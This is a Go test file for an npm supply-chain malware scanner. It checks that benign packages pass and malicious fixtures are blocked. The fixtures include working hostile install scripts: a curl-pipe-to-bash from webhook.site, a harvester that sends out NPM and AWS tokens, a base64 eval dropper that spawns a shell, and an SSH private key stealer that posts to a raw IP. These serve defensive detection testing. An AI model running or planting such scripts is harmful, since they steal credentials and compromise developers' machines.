package analyzer

import (
	"testing"

	"github.com/cawalch/go-yara-supplychain/pkg/ecosystems/npm"
)

func TestEngineEfficacy(t *testing.T) {
	engine, err := NewEngine()
	if err != nil {
		t.Fatalf("NewEngine failed: %v", err)
	}

	tests := []struct {
		name        string
		manifest    string
		files       map[string]string
		expectBlock bool
		expectFP    bool
		minSeverity RiskLevel
	}{
		// --- BENIGN PACKAGES (MUST PASS WITH ZERO FP) ---
		{
			name: "esbuild-legitimate-binary-fetcher",
			manifest: `{
				"name": "esbuild",
				"version": "0.20.0",
				"scripts": { "postinstall": "node install.js" }
			}`,
			files: map[string]string{
				"install.js": `
					const https = require('https');
					function download() {
						const url = "https://registry.npmjs.org/@esbuild/darwin-arm64/-/darwin-arm64-0.20.0.tgz";
						https.get(url, (res) => {
							// verifies sha256 checksum integrity
							verifyChecksum(res, "sha256-hash-value");
						});
					}
					download();
				`,
			},
			expectBlock: false,
		},
		{
			name: "node-gyp-c-plus-plus-builder",
			manifest: `{
				"name": "node-gyp",
				"version": "10.0.0",
				"scripts": { "install": "node-gyp rebuild" }
			}`,
			expectBlock: false,
		},
		{
			name: "core-js-console-donation",
			manifest: `{
				"name": "core-js",
				"version": "3.36.0",
				"scripts": { "postinstall": "node -e \"console.log('Thank you for using core-js!')\"" }
			}`,
			expectBlock: false,
		},
		{
			name: "clean-library",
			manifest: `{
				"name": "lodash-light",
				"version": "1.0.0"
			}`,
			files: map[string]string{
				"index.js": `module.exports = function isObject(val) { return val !== null && typeof val === 'object'; };`,
			},
			expectBlock: false,
		},

		// --- MALICIOUS ATTACKS (MUST BE BLOCKED) ---
		{
			name: "chalk-worm-pipe-to-bash",
			manifest: `{
				"name": "chalk-corrupted",
				"version": "5.3.0",
				"scripts": { "postinstall": "curl -s https://webhook.site/malicious-hook | bash" }
			}`,
			expectBlock: true,
			minSeverity: RiskCritical,
		},
		{
			name: "npm-aws-token-harvester",
			manifest: `{
				"name": "color-utility-evil",
				"version": "1.0.1",
				"scripts": { "preinstall": "node setup.js" }
			}`,
			files: map[string]string{
				"setup.js": `
					const https = require('https');
					const token = process.env.NPM_TOKEN;
					const awsKey = process.env.AWS_SECRET_ACCESS_KEY;
					if (token || awsKey) {
						https.get("https://webhook.site/exfil?t=" + token + "&k=" + awsKey);
					}
				`,
			},
			expectBlock: true,
			minSeverity: RiskHigh,
		},
		{
			name: "obfuscated-base64-eval-dropper",
			manifest: `{
				"name": "xml-fast-helper-evil",
				"version": "2.0.0"
			}`,
			files: map[string]string{
				"index.js": `
					// Payload: var net = require('net'); var sh = require('child_process').spawn('/bin/sh');
					const payload = "dmFyIG5ldCA9IHJlcXVpcmUoJ25ldCcpOyB2YXIgc2ggPSByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuc3Bhd24oJy9iaW4vc2gnKTs=";
					const fn = 'ev' + 'al';
					globalThis[fn](Buffer.from(payload, 'base64').toString('ascii'));
				`,
			},
			expectBlock: true,
			minSeverity: RiskCritical,
		},
		{
			name: "ssh-key-stealer-raw-ip",
			manifest: `{
				"name": "formatter-evil",
				"version": "1.0.0",
				"scripts": { "postinstall": "node drop.js" }
			}`,
			files: map[string]string{
				"drop.js": `
					const fs = require('fs');
					const https = require('https');
					const os = require('os');
					const key = fs.readFileSync(os.homedir() + '/.ssh/id_rsa', 'utf8');
					https.get("https://185.192.69.1:8443/steal?k=" + encodeURIComponent(key));
				`,
			},
			expectBlock: true,
			minSeverity: RiskCritical,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			pkg, err := npm.ParsePackage("", []byte(tt.manifest))
			if err != nil {
				t.Fatalf("ParsePackage failed: %v", err)
			}
			for path, content := range tt.files {
				pkg.SourceFiles[path] = []byte(content)
			}

			verdict, err := engine.AnalyzePackage(pkg)
			if err != nil {
				t.Fatalf("AnalyzePackage failed: %v", err)
			}

			isBlocked := verdict.Action == ActionBlock

			if tt.expectBlock && !isBlocked {
				t.Fatalf("expected package %s to be BLOCKED, got %s (Score: %.2f)",
					tt.name, verdict.Action, verdict.ConfidenceScore)
			}
			if !tt.expectBlock && isBlocked {
				t.Fatalf("FALSE POSITIVE: benign package %s was BLOCKED with score %.2f, Evidence: %+v",
					tt.name, verdict.ConfidenceScore, verdict.Evidence)
			}

			if tt.minSeverity != "" && verdict.RiskLevel != tt.minSeverity && verdict.RiskLevel != RiskCritical {
				t.Fatalf("expected minimum severity %s, got %s", tt.minSeverity, verdict.RiskLevel)
			}
		})
	}
}
